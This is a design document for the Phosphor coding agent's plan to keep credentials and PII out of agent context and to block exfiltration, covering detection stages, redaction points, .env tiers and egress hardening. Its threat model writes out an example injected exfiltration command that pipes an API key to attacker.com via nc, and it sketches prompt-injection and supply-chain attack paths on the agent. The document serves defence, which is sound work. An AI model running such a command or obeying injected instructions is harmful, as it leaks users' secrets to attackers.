# Secret Protection & Anti-Exfiltration Plan

## Goal

Keep credentials, API keys, and PII **out of agent conversation messages and
history** and **prevent exfiltration** — even if the agent is tricked via
prompt injection, a malicious package/script, or a compromised tool result.

Design constraints:
- Invisible to the end user (no blocking prompts for clean code).
- Heuristic-first, ML-as-optional-hook.
- Embedded and performant — no new heavy runtime in the agent loop.
- Defensive only; never logs or stores the matched secret itself.

---

## Current State (What Phosphor Already Has)

| Layer | Location | Coverage |
|---|---|---|
| `checkSecrets` regex | `pkg/agent/tools/edit.go:1056–1073` | 3 patterns: AWS secret, PEM private key, generic API key. Write-path only. |
| Banned commands | `pkg/agent/tools/bash.go:76–136` | Blocks curl, wget, nc, ssh, scp, telnet, package managers, system tools. |
| Env allowlist | `pkg/shell/env.go`, `pkg/config/config.go:815` | Bash child sees only PATH/HOME/TERM/etc. Secrets in env invisible. |
| Path confinement | `pkg/pathguard/`, `pkg/shell/confinement.go` | Blocks reads/writes outside workspace. Prevents `~/.ssh`, `/etc/shadow` leaks. |
| Proxy cred scrubbing | `pkg/shell/env.go:scrubProxyCreds` | Strips `user:pass@` from proxy URLs. |
| OTel trace redaction | `pkg/config/config.go:895` | `SensitiveMCPServers` list redacts results from spans. |
| PreToolUse hooks | `pkg/hooks/runner.go`, `pkg/agent/coordinator.go:948` | User-extensible gate on every top-level tool call. |

### Gaps

1. **Only 3 regex rules.** No GitHub PATs, Stripe keys, JWT, GCP, Azure, Slack,
   Twilio, DB connection strings, Docker Hub tokens, etc.
2. **Write-path only.** `view`, `grep`, `bash` output, MCP tool results, file
   tracker entries — secrets from these enter the LLM context unscanned.
3. **No bash-stdout scanning.** A script that `echo`s a token passes it directly
   into conversation history and then to the next API call.
4. **No PII detection.** Credit cards, SSNs, emails in tool output go straight
   to the provider.
5. **Interpreter egress not blocked.** `python -c "import urllib…"` circumvents
   the `curl` ban if `AllowInlineExecution` is toggled on.
6. **No entropy/ML layer for unknown secret formats.** Custom/internal tokens
   (random 64-char hex with a keyword nearby) slip through regex.

---

## Threat Model

```
                         ┌─────────────────────┐
                         │   LLM Provider API  │ ← exfiltration target
                         └──────────┬──────────┘
                                    │ conversation history
                                    │ (secrets here get echoed back)
                                    │
┌───────────┐    ┌──────────────────────────────────┐
│  Attacker │───▶│  Tool Output (bash,view,mcp,etc) │───▶ Agent messages
└───────────┘    └──────────────────────────────────┘
  injection /       ↑ secret detection point we're missing
  malicious pkg
```

Attack paths we defend against:
- **Read-then-forward**: Agent reads a `.env` file → content goes to provider →
  provider's infra logs it → later breach. Mitigation: redact before context.
- **Prompt injection**: Malicious code comments instruct agent to exfil
  (`echo $API_KEY | nc attacker.com 4444`). Mitigation: command block + output
  scan.
- **Accidental commit via edit**: Agent writes code containing a real key it
  discovered in a prior read. Mitigation: edit-path checkSecrets + expanded rules.
- **Supply chain**: `npm install` pulls a malicious postinstall that prints
  env vars. Mitigation: bash-output scan (can't prevent execution, can prevent
  output from reaching LLM context unredacted).
- **Side-channel via telemetry**: OTel traces/logs capture secrets. Mitigation:
  existing OTel redaction + expand.

---

## Architecture: Detection Pipeline

```
Tool executes
     │
     ▼
┌─────────────────┐    No match ───────────▶ Content enters context normally
│ Stage 1: Fast   │
│ Prefilter       │    Possible match
│ (Aho-Corasick)  │────────┐
└─────────────────┘        │
                           ▼
              ┌───────────────────────────┐
              │ Stage 2: Regex + Entropy  │
              │ (gitleaks detector API)   │
              └─────────────┬─────────────┘
                            │
               ┌────────────┼─────────────┐
               │            │             │
            high conf    low conf       PII hit
               │            │             │
               ▼            ▼             ▼
           redact      ┌──────────┐    redact/
           (block)     │ Stage 3: │    warn
                       │ ML Hook  │
                       │(opt-in)  │
                       └────┬─────┘
                            │
                      confirm / dismiss
```

### Stage 1 — Fast Prefilter (zero-alloc per call)

**What**: Aho-Corasick multi-pattern keyword scan on the raw bytes.
**Why**: Before running any regex (expensive on large outputs), filter out
content that clearly has no secret indicators. Most tool outputs (build logs,
`ls`, test results) hit zero keywords and skip straight through.
**Keywords**: `key`, `token`, `secret`, `password`, `api_key`, `bearer`, `auth`,
`private`, `credential`, `aws`, `sk_live`, `ghp_`, `gho_`, `github_pat`,
`xoxb`, `ya29`, `sk_or`, `-----BEGIN`, etc.
**Performance**: O(n) single pass; gitleaks internally uses this already.
For our use, we can wire it as the gatekeeper.

**Validated against peers**: hermes-agent gates each of its ~40 redaction
regexes behind a cheap O(1) substring test (e.g. `"eyJ" in text` for JWTs,
`":" in text` for JSON fields), measuring a -68% drop on the no-secret fast
path (5.6µs → 1.8µs per record). False negatives are impossible because every
regex already requires the gated substring to match. We replicate this exact
per-pattern gating inside our wrapper.

### Stage 2 — Regex + Entropy (the primary detector)

**Library choice: `gitleaks/gitleaks` (`detect` package)**

| Criterion | gitleaks | betterleaks | trufflehog |
|---|---|---|---|
| Stars | 29.3k | 1.9k | 27.9k |
| License | MIT | MIT | **AGPL-3.0** |
| Go lib API quality | usable (not "official", stable in practice) | good | explicitly unstable |
| Detector count | 700+ | 700+ | 800+ |
| Entropy | per-rule | per-rule + expr filter | per-rule |
| Custom rules | TOML | TOML + Expr | YAML |
| Network calls in detection | none | none | **yes (verifiers)** |
| Active development | frozen (security patches) | **yes** | yes |

**Decision: Use `gitleaks/v8/detect` in-process.** MIT license, 700+ rules,
zero network calls, no CGO, pure Go, well-known. The "feature-frozen" note
means the *ruleset* won't grow; that's fine — it already ships 700+ patterns
covering every major cloud/SaaS token format. We can add custom rules locally
via TOML structs without forking.

For a future-proofed path: **`betterleaks/betterleaks`** (same author, MIT,
same API, actively developed, adds BPE token-rarity filtering + Expr-based
context filters). If gitleaks's 700 rules miss our needs, we can swap to
betterleaks later with minimal code change.

**Configuration strategy**:
- Load gitleaks default config → filter to detectors relevant to code/secrets
  (skip ones requiring network verification).
- Ship a small TOML override file for Phosphor-specific additions (e.g.
  provider API keys used in phosphor.json, Hyper/Bedrock tokens).
- Allow users to extend via `.phosphor/secret-rules.toml` (same format as
  gitleaks custom rules).
- Allowlist built into the detector: `testdata/`, `_test.go`, `*.example`,
  `fixtures/`, `vendor/`, `node_modules/`, gitleaks-style `// gitleaks:allow`
  comments.

### Stage 3 — ML Hook (optional, opt-in, advanced)

For users who want ML confirmation on borderline findings, use the existing
PreToolUse hook system. We ship the hook **recipe**, not the model runtime:

```json
// phosphor.json
"hooks": {
  "PreToolUse": [{
    "name": "pii-classify",
    "matcher": "^(view|grep|glob|bash|edit|write|multiedit|append|job_output)$|^mcp_",
    "command": "./scripts/pii-classify.sh",
    "timeout": 5
  }]
}
```

The script receives the **tool call input** on stdin (Phosphor's hook stdin
protocol), extracts candidate text from the tool's arguments, runs it through a
model (`LFM2.5-Encoder-350M-PII-Detector` via ONNX, `deeppass2-bert`, or even
an Ollama-served classifier), and returns a
`{"decision":"deny","reason":"PII detected by pii-classify hook"}` envelope if
confident. The real tool name is `view`, not `read`; MCP tools are matched via
their `mcp_` prefix.

Today this is intentionally an **input-only** PreToolUse gate. Phosphor does not
yet have a `PostToolUse` event, so this recipe cannot inspect the eventual
stdout/result of `view`, `grep`, `bash`, or MCP tools. Result-based ML scanning
needs that future hook event; the heuristic gitleaks read-path redaction covers
the shipped default result path in the meantime.

This keeps the core binary zero-ML while letting security-conscious users
add the classifier layer. It runs out-of-process so a model crash doesn't
take down the agent.

### Redaction Output Correctness (Lessons from hermes-agent issue #35519)

Two subtle correctness rules, learned from other agents' bug history, that a
naive "replace with `***`" scheme gets wrong:

1. **Use a NON-REUSABLE sentinel for writable content, not a head/tail mask.**
   hermes masked a `ghp_` PAT as `ghp_S1...Pn2T`. The agent read it from
   `config.yaml`, edited the file, and wrote the masked string back — silently
   corrupting the stored credential into a dead 13-char value (401 on next
   auth). Their fix: emit `«redacted:ghp_…»` — a marker that keeps only the
   vendor prefix label (so the agent still knows *which* credential is present)
   but is syntactically invalid as a token, so it can never be written back as
   a usable key. Rule for Phosphor:
   - **Logs / display** → head+tail mask (`mask_secret`, length-floor gated) is
     fine — that text is never fed back into a file.
   - **Content the agent may echo into an edit** (view/read output, tool
     results) → **sentinel only**, never a head/tail mask.

2. **Make redaction reversible-by-id for the provider path (tokenization).**
   opencode's export redactor (`[redacted:<kind>:<id>]`) and the VibeGuard
   ecosystem plugin both restore the original **locally** by stable id. This
   lets the model *operate on* a secret (e.g. "move this API key into an env
   var") while the wire never carries it, and lets us restore it when writing
   to trusted local files. Keep the id→value map in-process (or an encrypted
   session store) with a short TTL; never persist it in the transcript.

**Context-aware FP suppression (`code_file` / `file_read` modes).** hermes
skips the generic `KEY=value` and `"apiKey":"value"` regexes when the buffer is
known source code (because `MAX_TOKENS=***` and `"apiKey": "test"` fixtures are
FP noise), while *keeping* the high-precision checks (vendor prefixes, auth
headers, PEM blocks, JWTs, DB connstrings, URL userinfo). Map this to tool
context:
- Reading a `.go`/`.py`/`.js` file → `code_file` mode (high-precision checks only).
- `env`, `cat .env`, `aws describe-*` output → full check set.

---

## Integration Points (Where to Scan)

| # | Injection point | File | Action on hit |
|---|---|---|---|
| 1 | Edit/write content | `pkg/agent/tools/edit.go` (replace `checkSecrets`) | **Block edit**, return error to model with redacted preview |
| 2 | Bash stdout/stderr | `pkg/shell/shell.go` (post-exec, pre-return) | **Redact** before content reaches message; log fingerprint |
| 3 | View/read file content | `pkg/agent/tools/view.go` (pre-return) | **Redact** + warn in tool response |
| 4 | Grep results | `pkg/agent/tools/grep.go` | **Redact** matched line values |
| 5 | MCP tool results | `pkg/agent/tools/mcp/` (post-call) | **Redact** (already have `SensitiveMCPServers` OTel gate; extend to content) |
| 6 | Outgoing message | Before sending to provider | Last-resort **mask** (replace with `<redacted:rule-id>`) |

For points 2–5, the scan runs **after** the tool executes and **before** the
result serializes into a message. The model sees `<redacted:github-pat>` in
the content — it still gets full semantic context (it knows a file contains a
GitHub PAT) without the raw credential.

The fingerprint (hash) stays in the session store so the UI can show "redacted
3 findings in this session" without storing the secret itself.

---

## PII Layer

| Library | Stars | License | What |
|---|---|---|---|
| `censgate/redact` | pre-1.0, small | Apache-2.0 | Email, phone, SSN, credit card, IP, MAC, UUID, IBAN. Tokenization/masking modes. Importable Go API. |
| `ullauri/piidetect` | small | MIT | Static-analysis tool — finds PII in source via AST. |

**Decision (superseded — shipped as a self-contained masker, not
'censgate/redact').** This section originally named 'censgate/redact', but its
**Go line is abandoned**: the repo pivoted to a Rust core, the Go module is
frozen at 'v0.4.1' and marked "as-is / unsupported", its README no longer
matches the code, and its CGO build is unverified against our CGO-off /
green-tea-GC posture. Taking on an unmaintained dependency to power an opt-in
mask is the wrong trade, so the masker was **built in-house** in
'pkg/agent/outgoing_redact.go' on stdlib 'regexp' (RE2 → linear-time, no ReDoS,
no CGO, no network, no extra supply-chain surface). It stays a masking-only
post-filter on the outbound path (point 6), never a blocking gate — the SSN/IP
shapes FP heavily on code, logs, and test fixtures — and it is **opt-in**
('security.redact_outgoing_pii', default **off**), whereas the secret pass stays
default-on because gitleaks is high-precision.

Covered — each hit becomes a typed sentinel such as '<pii:email>':

- **Email**, **SSN** ('NNN-NN-NNNN'), **credit card** (13–19 digits, Luhn-
  validated), **phone** (10–15 digits, word-bounded so it cannot eat the numeric
  tail of a hash or id), **IPv4** (octets 0–255), **IPv6** (full eight-group and
  '::'-compressed forms), **MAC** (':'- or '-'-separated), **UUID** (canonical
  8-4-4-4-12), **IBAN** (grouped or flat, gated on the ISO 13616 mod-97 == 1
  check so ordinary 'XX##…' words never match).

Deliberately **omitted** — absent from the original set, or FP-catastrophic for a
developer tool whose transcript is mostly code:

| Omitted | Rationale |
|---|---|
| Name, Address, PO-Box, Zip | Unbounded free-text geography; on code it would mask half the repo. |
| Date, Time | Every timestamp and log line turns into a false positive. |
| Link / URL | Breaks every doc and link the agent is meant to reason over. |
| ISBN, BTC address | Out of scope for a coding assistant; low volume, high collision. |
| MD5 / SHA / 'git' hex | Indistinguishable from legitimate hex output (commit shas, colours, ids); masking it destroys context. |
| UK-only set (NHS, National Insurance, …) | Locale-specific; not on the default path. |

Known regressions vs 'censgate/redact', by design: **phone** is a shape heuristic
rather than libphonenumber parsing, and there is **no per-hit confidence score**
(censgate emits one). Precision is bought instead with validation gates — Luhn on
cards, mod-97 on IBAN, digit-count plus word-boundary on phone. If a scored or
probabilistic detector is ever warranted that belongs in the Phase-4 ML hook
recipe ('pii-classify'), not in a regex dependency.

---

## The Known-Value Redaction Registry, In Practice

(The Phase-8 item, unpacked. Honest version: the *scan* is cheap; the *setup*
is the work; and its coverage is bounded by what you register.)

### What it is

A process-global set of **exact secret strings that our own process loaded**
(your provider API keys, OAuth tokens, anything fantasy/`phosphor.json`/the
keyring hands us). Every secret, on load, calls `Register(v)`. Any text that
later flows through a redaction point (bash stdout, file reads, MCP results,
logs) has those **literal** strings scrubbed. It is *not* a pattern detector —
it knows nothing about `AKIA…` or `sk-…` shapes. It only scrubs the specific
values it was told about. That is the whole idea, and also its limit.

### Why openclaw's version looks complex, and the Go simplification

openclaw hand-rolls a matcher because JS has no good many-literal-substitute
primitive: a first-char probe `Set`, a lazily-compiled regex over 6-char
prefixes, bucketed by prefix, then full-value verification. In Go we get that
for free — **`strings.Replacer`** *is* a multi-pattern literal matcher (an
internal trie, essentially Aho–Corasick for literals), and its `Replace` is
documented safe for concurrent use (matters: agent runs tools in parallel).
So our registry is roughly:

```go
type Registry struct {
	mu       sync.RWMutex
	values   map[string]struct{}
	replacer *strings.Replacer // rebuilt lazily; nil = dirty
	firsts   map[byte]struct{} // cheap prefilter
}

func (r *Registry) Register(v string) {
	if len(v) < 6 { return } // too short -> would scrub everywhere (FP); real keys are long
	for _, form := range []string{v, url.QueryEscape(v), jsonEscape(v)} {
		r.mu.Lock()
		if _, ok := r.values[form]; !ok {
			r.values[form] = struct{}{}
			r.firsts[form[0]] = struct{}{}
			r.replacer = nil // dirty
		}
		r.mu.Unlock()
	}
}

func (r *Registry) Scrub(text, mask string) string {
	// fast path: does any registered secret even *start* with a byte present here?
	// (single contains over the first-char set, ~O(len(text)))
	if !r.maybeContains(text) { return text }
	rep := r.getReplacer() // rebuild under lock if dirty, memoize otherwise
	return rep.Replace(text)
}
```

Fast path on clean output is one pass over the first-char probe (or, better,
gate the whole thing behind the same gitleaks keyword prefilter so we skip
even that). Rebuild cost is paid once per registry change, not per call.

### Cost, honestly

- **Per-call**: O(len(text)) on the prefilter; on a hit, one `Replacer.Replace`
pass (linear). Cheap — but not literally free; the *first-char probe* has a
pathological case (many distinct first chars => many `Contains` passes), which
is why gating behind a single keyword scan is the right default.
- **Registration is the real work**, not the scan: every secret must route
through `Register` at load time. Miss one path and that secret is invisible to
this layer. That plumbing is the only "heavy" part — the runtime is simple.
- **Bounded**: cap at N values (openclaw uses 512) with LRU eviction so a
long-running session can't grow the trie unbounded. Note the tension: eviction
can drop an *active* credential, so keep the live set under the cap.
- **Encodings triple the set**: openclaw registers raw + URL-encoded +
JSON-escaped so a secret that got `encodeURIComponent`'d or `JSON.stringify`
escaped before hitting the wire is *still* caught. Cheap, but ~3x entries.

### What it will NOT catch (so don't oversell it)

- A secret you never registered. It only scrubs what you told it about.
- Anything *transformed* beyond the 3 registered forms — base64'd, hashed,
split across lines, concatenated at runtime. That's gitleaks/entropy's job, not
this one's.
- Values shorter than the min-length floor (6) — deliberately, to avoid
scrubbing common short tokens; a 6-char "secret" therefore slips through.
- It is **exact-literal** matching. No regexes means **no ReDoS surface** here,
which is a genuine plus vs a regex redactor.

### What we'd actually register, and where it pays off

The realistic Phosphor payload is small: the fantasy provider tokens (Anthropic,
OpenAI, Gemini, Bedrock…), Hyper/Copilot OAuth tokens, and any MCP-server creds.
Because the bash env is already allowlisted, a child process *cannot* read our
provider key from `os.Environ` — so the registry's value is the *other* leak
paths: an agent reading `phosphor.json`/the keyring file via the `view`/`read`
tool, or a malicious script `cat`ing `~/.phosphor/config.json` so the raw key
lands in **bash stdout** and from there into the model context. Registering our
tokens means those exact strings get scrubbed from tool output before they ever
reach the transcript — the cheap, high-precision complement to gitleaks catching
the formats we didn't know about.

So: worth building, low effort in Go, default it on. Just do not describe it as
"a secret scanner" — it is a known-values eraser, and that is a precise and
different thing.

## Sensitive Workspace Files (`.env` and friends)

There is currently **no** `.env` handling: a workspace `.env` reads back raw
through `view`/`read`/`grep`/`bash`, and the only guard is the write-path
`checkSecrets` when the agent *writes*. `.env` files need their own treatment
that the rest of this plan's content-scanning does not give them.

### Two different mechanisms — do not merge them

| | (A) Path-based whole-value redaction | (B) Content-based detection |
|---|---|---|
| Trigger | file path matches a sensitive glob | any file/command output |
| What it redacts | the **RHS of every assignment**, unconditionally | only spans that match a detector |
| Cost | structural parse, no detectors run | gitleaks + entropy (FP-prone) |
| Recall | 100% of assignment values | partial (misses custom/opaque keys) |

**`.env` is squarely mechanism (A).** The whole point: `.env` has a known
`KEY=value` shape, so you treat *everything after the `=`* as secret *by
definition* instead of running detectors and hoping the generic/entropy rule
fires on `MYAPP_SIGNING_KEY=`. That's higher-recall and the FP cost is bounded
because you already decided the *file* is sensitive. gitleaks's generic-API-key
+ entropy rules will catch some `.env` lines and silently miss opaque custom
ones — so do not lean on (B) for `.env`.

**The registry does not help `.env`.** The known-value registry only scrubs
secrets *Phosphor itself loaded* (provider tokens). The values in a user's
`.env` are theirs — we never registered them, so they're invisible to it. (B)
and (A) are what cover them.

### Read path

- **Keep the keys, redact the values.** The agent usually still needs to know
  `DATABASE_URL` *exists* and is named to do its job; it almost never needs
  the literal. Emit `DATABASE_URL=«redacted:…»` (hermes-style non-reusable
  sentinel, vendor-label only), never a head/tail mask.
- **Why non-reusable matters for `.env` specifically:** a head/tail mask
  (`sk-l…7890`) that the agent later echoes into an `edit` writes a
  syntactically-plausible-but-dead value back into the file — that's *exactly*
  the hermes #35519 write-back-corruption bug, and `.env` is its most likely
  victim. Writable content ⇒ sentinel only.
- **Legit round-trips** (agent moves a value, copies between `.env` files):
  back this with the reversible-by-id tokenization so the original can be
  restored on write to a trusted path, without the raw value living in the
  transcript.

### Write / edit path

- Editing an existing `.env`: operate on sentinels, restore-on-write via the
  id map; never write a masked value.
- **Writing a *new* secret to a non-gitignored path** is the leak vector: warn
  (or require confirmation) when the agent writes credential-looking material
  to a file that is **not** covered by `.gitignore`. `.env` is usually ignored
  (so it never gets committed) — that's repo hygiene, not read-protection, so
  we still need the read-side work above regardless.

### The bash asymmetry (important, and fixable)

`view .env` gives us the path, so (A) applies. `cat .env` / `source .env`
does **not** — the tool sees path-less stdout bytes, so we'd fall back to (B)
and lose the whole-value guarantee. Mitigation that fits Phosphor: the bash
command is already parsed into argv by `pathguard`/confinement, so we can
detect commands that *reference a sensitive glob* (`cat`/`grep`/`source`/`less`
etc. against a `.env*`/`credentials*` path) and apply (A)-style redaction to
that command's output specifically. When detection is inconclusive, fall back
to registry + gitleaks as usual.

### FP control / default set

**The `.env` family is three tiers, not two.** Blanket-allowlisting `*.example`
is wrong (it's an evasion hole) and blanket-redacting `*.rc` is wrong (it guts
direnv config). Split by *what the exemption is from*:

- **Tier SENSITIVE — mechanism (A) whole-value redaction** (keep keys, sentinel
  the values) **plus** (B) detection **plus** the registry:
  `.env`, **every** `.env.*` variant (`.env.local`, `.env.development`,
  `.env.production`, `.env.staging`, `.env.test`, …), `*.env`, plus the rest:
  `credentials*.json`, `secrets.*`, `*service-account*.json`, `.netrc`,
  `.npmrc`, `.git-credentials`, `id_rsa`/`*.pem`/`*.p12`. All `.env*` are
  sensitive by default — the operator does not opt *in*.

- **Tier TEMPLATE — exempt from (A) only, NEVER from (B)/registry:**
  `.env.example`, `.env.examples`, `.env.sample`, `.env.template`, `.env.dist`,
  `.env.tpl`, `.env.defaults` (case-insensitive, matched on the exact filename,
  not a substring). This is *the* thing that's "ok to read" — it's the committed
  convention showing the file's shape, so the agent reads it in full (keys and
  placeholder values). **But detection still runs.** That is precisely what makes
  "example files are the exception" safe rather than a trick: if someone names a
  real secret file `.env.example` to dodge the whole-value rule, gitleaks + the
  registry still scrub the actual key. Exemption is only from the blunt
  whole-value rule, never from content detection — see the "Protecting
  .env.example" subsection below for the hashed learned-secret memory that
  also catches planted or repeated real values.

- **Tier MIXED (`.envrc` / direnv) — protected, but keep benign keys visible:**
  direnv `.envrc` files *usually* hold harmless shell setup (`use flake`,
  `export PATH=…`, `NODE_ENV=development`) yet *can* stash tokens. Treat them
  sensitive (A) per the operator's intent, but carry a **known-harmless key
  allowlist** so we do not redact non-secret config the agent legitimately needs
  (`PATH`, `NODE_ENV`, `LANG`, `DEBUG`, `LOG_LEVEL`, …); secret-shaped or
  high-entropy values are still scrubbed, and (B) runs as the backstop. This
  repo's own root `.envrc` is literally just `use flake` — the concrete reason a
  flat `.envrc`-allowlist and a flat `.envrc`-redact are both wrong.

### Protecting `.env.example`: detection + a hashed learned-secret memory

The goal — no real value from a template file may reach the model — is the
right one, but the mechanism should not be blanket value-redaction (that strips
the informative placeholders `DATABASE_URL=postgres://…`, `LOG_FORMAT=pretty`
that are the file's whole purpose, while a `your_key_here` placeholder is not a
secret worth hiding). Instead:

1. **Keep the TEMPLATE tier's detection-only redaction.** gitleaks/entropy scrub
   the real `sk_live_…`/`AKIA…`/PEM dropped into a template (whether by mistake
   or by a malicious script planting one) and leave junk placeholders alone.
   Detection is the enforcement of "example files are placeholders only."
2. **Add a hashed learned-secret memory.** When detection flags a value as a
   genuine secret anywhere, store a keyed hash (HMAC under a process secret
   key, the openclaw `sentinel.ts` nonce pattern) of it — not the plaintext —
   in a session set (optionally persisted encrypted as a durable memory). From
   then on, every appearance of that value — in a `.env.example`, a log line, a
   `cat` — matches the digest and is scrubbed, across the whole session and (if
   persisted) across restarts, without ever storing the secret. Durable sibling
   of the known-value registry: the registry holds secrets we *load*; the hash
   memory holds secrets we have *seen and judged sensitive*.

**Hashed tokens vs encrypted tokens — different jobs.** An HMAC/keyed hash is
irreversible: right for logs, telemetry, and transcript redaction where the
value must never be recoverable. openclaw's encrypted sentinel is reversible in
the broker only: right when the agent must legitimately round-trip a value. Pick
per use site.

**Honest limits of hashing (so it is not oversold as safe):**
- Not confidentiality for low-entropy values. `sha256("123")` or a short PIN is
  trivially brute-forced. Hashing buys dedup + learned-secret detection, not
  hiding, for weak values — which is why detection + the exact registry still
  carry the secret cases. Use a keyed hash (HMAC), not a bare digest, so an
  outsider holding a stored hash cannot offline-confirm a guessed value.
- The property only holds if the plaintext never enters the message. Emit the
  hash token and drop the raw value at the redaction point; a hash beside
  leaked plaintext buys nothing.
- A hash is a permanent correlation id. Equal digest means equal value, so
  `fileA.API_KEY == fileB.API_KEY` becomes observable. Useful ("these configs
  share a credential") but it leaks structure — do not treat "only a hash" as
  license to log arbitrary material.

And keep-keys/redact-values already delivers the UX you described: the agent
sees `STRIPE_KEY`, `DATABASE_URL` as keys and can tell the user "please set
these in .env" without ever holding a value.

Non-`.env` allowlists still apply to skip test/doc material entirely:
`testdata/`, `fixtures/`, `__snapshots__/`, and inline `// phosphor:allow` for
one-off opt-outs. Also feed the Tier-SENSITIVE list into the **system prompt**
so the agent avoids reaching for these files when it doesn't need to
(defense-in-depth, not the enforcement — enforcement stays in the read/scan path).

---

## Exfiltration Hardening (Beyond Detection)

Detection alone won't stop a sufficiently clever injection attack; belt-and-
suspenders from the existing confinement + new layers:

| Measure | Status | Notes |
|---|---|---|
| Binary network bans (curl, wget, nc, ssh…) | ✅ done | `bannedCommands` in bash.go. |
| Env allowlist | ✅ done | Bash sees zero secrets. |
| Path confinement (no `~/.ssh`, `/etc/*`) | ✅ done | pathguard + AST analysis. |
| Proxy cred scrubbing | ✅ done | env.go. |
| Inline-exec guard (`-c`, `-e`, `-r` flags) | ✅ done | `AllowInlineExecution` gate. |
| **Network egress as a policy** | ✅ done | Interpreter HTTP via `python -c` bypasses binary bans when toggled. Mitigations: (a) default `AllowInlineExecution = false` ✅, (b) document risk, (c) optional `tools.bash.network` argv-level allowlist/CIDR policy (Phase 5, opt-in). |
| **Bash output scanning** | ✅ done | `formatOutput` runs the redaction pass over combined stdout/stderr before it reaches the transcript (Phase 1); background `job_output` redacts on read. |
| **Secret-aware `SensitiveFilePatterns`** | ✅ done | Configurable file glob list (`.env*`, `*.pem`, `credentials*`, `id_rsa`) that the agent is told to avoid and that auto-redacts on read. Shipped as the (A) whole-value read path (`SensitiveFilePatterns` + `redact_sensitive_files`, default on): dotenv/JSON/opaque shape parsers keep keys, sentinel the values; the `.env` family is three-tier (SENSITIVE / TEMPLATE detection-only / MIXED `.envrc` with a harmless-key allowlist); bash argv-detect applies the same rule to `cat`/`source`-style reads; Tier-SENSITIVE set is fed to the system prompt as an advisory nudge. |
| **Provider-request body scan** | ✅ done | Before fantasy sends messages to the API, one last regex pass masks any credential that somehow survived into history (e.g. via user paste or compaction reintroduction). Cheap: only matches against candidate fragments. Shipped in Phase 2 (`redactOutgoingMessages` in `PrepareStep`). |
| **Redaction output correctness** | ✅ done | Phase 6: writable content stays a non-reusable sentinel by default (never a head/tail mask), so an echoed edit cannot resurrect a key. Opt-in `tokenize_secrets` upgrades read-path findings and dotenv values to reversible `<secret:kind:id>` tokens the agent can round-trip, resolved only on writes to a trusted sensitive file (`.env` family, credentials, keys) from an in-process TTL+size-bounded store that never persists to the transcript. Context-flagged scan API adds `code_file`/`file_read` modes; `code_file_false_positive_mode` (default on) drops the generic `KEY=value` family on source reads while keeping vendor/PEM/JWT checks. The provider wire secret mask is a hard boundary forced on by `wire_secret_redaction_force`. Read-path switches are frozen at an import-time snapshot so a mid-session env/config change cannot silently disarm them. |

---

## Performance Budget

The scanner runs per tool call. Budget: **< 1 ms per KB of content**, zero GC
allocations on the fast path.

| Stage | Technique | Cost |
|---|---|---|
| Prefilter | Aho-Corasick automaton (gitleaks built-in) | O(n), 1 pass |
| Regex | RE2 (`regexp`, no backtracking), gated behind keyword hit | Only on candidates |
| Entropy | Shannon on captured group | O(secret length) |
| PII (self-contained stdlib-`regexp` masker) | regex only, small ruleset, outgoing path only | Only on outbound, opt-in |

For the common case (clean output, 0 keyword hits), total overhead is one
Aho-Corasick scan — nanoseconds per byte.

For very large outputs (>1 MB, build logs, big greps), scan only the first/last
N KB plus lines containing keyword hits (gitleaks does line-level with
prefilter keywords, so it's already line-scoped).

---

## Limitations & Edge Cases (Being Realistic)

| Edge case | Detection status | Mitigation |
|---|---|---|
| Custom/internal token formats | ❌ | User-extensible TOML rules + ML hook for entropy fallback |
| Obfuscated (base64-encoded, split, XOR'd) secrets | ❌ | gitleaks `--max-decode-depth` for base64/hex; XOR/rot13 undetectable by design |
| Secrets in model-generated code (fabricated/hallucinated patterns that *look* like real ones) | FP | Allowlist on `testdata/`/test fixtures, ML hook confirmation for borderline |
| Secrets in **user-typed prompts** (paste a key into chat) | ❌ agent can't filter input | Provider-side tokenization; redaction layer on outgoing messages (point 6) catches it |
| Secrets in git history (blame, git show, git log) | ❌ | bash output scan (point 2) catches it via stdout |
| Secrets in compiled artifacts (`.so`, `.dll`) | ❌ | Not in scope — this is a text scanner |
| Multi-byte / non-ASCII encoding tricks | partial | Prefilter works on bytes; regex on decoded string |
| Performance on 10 MB grep | risk | Limit scan to candidate lines, not entire blob |
| False-positive FP rate | moderate | Aho-Corasick prefilter suppresses 95%+; keyword-gated regex; entropy gates; allowlists |
| Attacker intentionally bypasses (timing, Unicode homoglyphs in filenames) | ❌ | Pathguard normalizes; document as threat boundary |

**Honest assessment**: regex + entropy is genuinely enough for the dominant
case (known provider token formats, which is >90% of real-world leak volume —
the gitleaks author's own analysis, "regex is almost all you need"). The
residual risk (custom unknown secrets, novel formats) is what the ML hook
covers — and only when a user opts in. We do **not** pretend the system is a
provably-complete secret scanner; it's a defense-in-depth layer that makes
the easy attacks cheap and the hard attacks require deliberate effort.

---

## Implementation Phases

| Phase | Scope | Deliverable |
|---|---|---|
| **0** | Replace 3-regex `checkSecrets` with gitleaks `detect.Detector` | edit/write path uses 700+ rules; zero API change |
| **1** | Bash output + view/grep/MCP result scanning (redact-before-context) | points 2–5 wired; `<redacted:rule>` in messages; session fingerprint log |
| **2** | Outgoing-message last-resort mask + PII (self-contained stdlib-`regexp` masker) | point 6; `redact_outgoing_{secrets,pii}` config |
| **3** | Sensitive workspace files: path-based **whole-value** redaction (keep keys, sentinel values) for `.env*`/`credentials*`/keys + argv-detect sensitive reads in bash + reversible write-back; system-prompt nudge | `SensitiveFilePatterns` config + read-side structural redactor — **shipped**; reversible-by-id write-back/tokenization shipped in Phase 6 (opt-in `tokenize_secrets`; the default path stays sentinel-only) |
| **4** | ML hook recipe (`pii-classify.sh` example in docs) + user TOML rules | input-only `PreToolUse` ML classifier recipe, `scripts/pii-classify.sh`, and `.phosphor/secret-rules.toml` loader — **shipped**; result-based `PostToolUse` hook deferred |
| **5** | Optional: egress policy mode (allowlist of network targets, default deny) | `ToolBash.Network` config block — **shipped** as opt-in command-argv policy |
| **6** | Redaction output correctness: sentinels for writable content, reversible-by-id tokenization, `code_file`/`file_read` FP modes, env snapshot + `force` path | `tokenstore.go` sentinel/tokenization helpers + `scan_context.go`/`redaction_policy.go` context-flagged scan API — **shipped**: non-reusable sentinels stay the default; opt-in `tokenize_secrets` issues reversible `<secret:kind:id>` tokens restored only on writes to trusted sensitive files; code-file FP mode (`code_file_false_positive_mode`, default on) drops the generic `KEY=value` family on source reads; the provider wire secret mask is forced on via `wire_secret_redaction_force` (default on) |
| **7** | Structured-JSON key-drop for MCP/CLI tool results + subprocess env dynamic-suffix predicate | complement layer for JSON-producing tools |
| **8** | Known-value redaction registry: scrub the exact secret strings Phosphor/fantasy loaded from all tool output + logs (+ encoded/JSON-escaped forms) | bounded registry; complements gitleaks |
